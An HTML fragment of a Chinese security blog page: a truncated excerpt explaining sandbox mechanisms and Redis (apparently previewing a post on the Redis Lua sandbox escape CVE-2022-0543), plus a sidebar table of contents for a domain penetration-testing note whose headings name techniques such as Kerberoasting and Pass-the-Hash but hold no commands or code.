class="info-item-1">一.沙箱的含义沙箱是一种安全机制，限制程序只能访问特定资源，防止恶意操作影响系统。    场景 沙箱作用    浏览器沙箱 网页代码只能操作浏览器，无法直接读写本地文件   游戏沙箱 外挂程序无法修改游戏内存   Redis Lua 沙箱 Lua 脚本无法执行系统命令、访问文件系统   :::info关系图 物理机 ├── 容器 A（Docker） │   └── Redis 进程 │       └── Lua 沙箱 ←── 你的漏洞在这层突破 │           └── 恶意脚本（理论上只能操作 Redis） │ └── 容器 B（其他应用） ::: 1.什么是redisRedis，英文全称是Remote Dictionary Server（远程字典服务），是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 与MySQL数据库不同的是，Redis的数据是存在内存中的。它的读写速度非常快，每秒可以处理超过10万次读写操作。因此redis被广泛应用于缓存，另外，Redis也经常用来做分布式锁。除此之...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/111.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">杰哥</div><div class="author-info-description">人性背后是白云苍狗，愿你我都做生活的高手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/jiege56" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1977691073@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E5%9F%9F%E6%8E%A7%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">一.域控环境配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%88DC%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">准备域控制器（DC）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90%E5%90%8E%E9%AA%8C%E8%AF%81"><span class="toc-number">2.1.</span> <span class="toc-text">安装完成后验证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-%E5%B0%86windows%E9%9D%B6%E6%9C%BA%E5%8A%A0%E5%85%A5%E5%9F%9F%E6%88%90%E5%91%98"><span class="toc-number">3.</span> <span class="toc-text">二.将windows靶机加入域成员</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9C%A8-Windows-%E9%9D%B6%E6%9C%BA%E4%B8%8A%E8%AE%BE%E7%BD%AE-DNS"><span class="toc-number">3.1.</span> <span class="toc-text">1. 在 Windows 靶机上设置 DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95-DNS-%E8%A7%A3%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">2. 测试 DNS 解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8A%A0%E5%85%A5%E5%9F%9F"><span class="toc-number">3.3.</span> <span class="toc-text">3. 加入域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%AA%8C%E8%AF%81%E5%8A%A0%E5%85%A5%E6%88%90%E5%8A%9F"><span class="toc-number">3.4.</span> <span class="toc-text">4. 验证加入成功</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C-whoami-%E6%98%BE%E7%A4%BA%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7"><span class="toc-number">3.5.</span> <span class="toc-text">如果 whoami 显示本地用户</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-number">4.</span> <span class="toc-text">查看当前用户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E5%88%B0%E5%9F%9F%E8%B4%A6%E6%88%B7"><span class="toc-number">5.</span> <span class="toc-text">切换到域账户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">三.开始渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E4%B8%BB%E6%9C%BA%E6%8E%A7%E5%88%B6%EF%BC%88%E5%9F%9F%E5%86%85%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">一.主机控制（域内）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%87%AD%E8%AF%81%EF%BC%88%E9%9C%80%E8%A6%81%E6%8F%90%E6%9D%83%E5%88%B0-SYSTEM%EF%BC%89"><span class="toc-number">7.1.</span> <span class="toc-text">2. 内存凭证（需要提权到 SYSTEM）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Kerberoasting%EF%BC%88%E6%99%AE%E9%80%9A%E5%9F%9F%E7%94%A8%E6%88%B7%E5%8D%B3%E5%8F%AF%EF%BC%89"><span class="toc-number">7.2.</span> <span class="toc-text">3. Kerberoasting（普通域用户即可）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-%E2%86%92-%E7%AE%A1%E7%90%86%E5%91%98-SYSTEM%EF%BC%89"><span class="toc-number">7.3.</span> <span class="toc-text">三、权限提升（普通用户 → 管理员&#x2F;SYSTEM）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.3.1.</span> <span class="toc-text">1. 本地提权漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%EF%BC%88NTLM-Relay%EF%BC%89"><span class="toc-number">7.3.2.</span> <span class="toc-text">2. 土豆家族提权（NTLM Relay）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-PrintSpoofer-GenericPotato"><span class="toc-number">7.3.3.</span> <span class="toc-text">3. PrintSpoofer&#x2F;GenericPotato</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">7.3.4.</span> <span class="toc-text">4. 计划任务&#x2F;服务提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%87%AD%E8%AF%81%E5%90%8E%EF%BC%89"><span class="toc-number">7.4.</span> <span class="toc-text">四、横向移动（获取域凭证后）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Pass-the-Hash"><span class="toc-number">7.4.1.</span> <span class="toc-text">1. Pass-the-Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Pass-the-Ticket"><span class="toc-number">7.4.2.</span> <span class="toc-text">2. Pass-the-Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8%E5%B7%B2%E8%8E%B7%E5%8F%96%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">7.4.3.</span> <span class="toc-text">3. 使用已获取的明文密码</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/" title="域渗透实战笔记"><img src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域渗透实战笔记"/></a><div class="content"><a class="title" href="/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/" title="域渗透实战笔记">域渗透实战笔记</a><time datetime="2026-07-15T04:00:00.000Z" title="发表于 2026-07-15 12:00:00">2026-07-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/30/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" title="Shiro反序列化漏洞详解"><img src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro反序列化漏洞详解"/></a><div class="content"><a class="title" href="/2026/06/30/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" title="Shiro反序列化漏洞详解">Shiro反序列化漏洞详解</a><time datetime="2026-06-30T08:00:00.000Z" title="发表于 2026-06-30 16:00:00">2026-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/30/Redis%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%88CVE-2022-0543%EF%BC%89/" title="Redis沙盒逃逸（CVE-2022-0543）"><img src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis沙盒逃逸（CVE-2022-0543）"/></a><div class="content"><a class="title" href="/2026/06/30/Redis%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%88CVE-2022-0543%EF%BC%89/" title="Redis沙盒逃逸（CVE-2022-0543）">Redis沙盒逃逸（CVE-2022-0543）</a><time datetime="2026-06-29T16:00:00.000Z" title="发表于 2026-06-30 00:00:00">2026-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/16/hello-world/" title="Hello World"><img src="https://s.panlai.com/zb_users/upload/2025/04/bizhihui_com_202504061743931260453893.jpg-pcthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2025/12/16/hello-world/" title="Hello World">Hello World</a><time datetime="2025-12-16T10:05:37.000Z" title="发表于 2025-12-16 18:05:37">2025-12-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/16/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客"><img src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503301743321230135180.jpg-armthumbs" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="我的第一篇博客"/></a><div class="content"><a class="title" href="/2025/12/16/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客">我的第一篇博客</a><time datetime="2025-12-16T09:21:15.000Z" title="发表于 2025-12-16 17:21:15">2025-12-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 杰哥</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
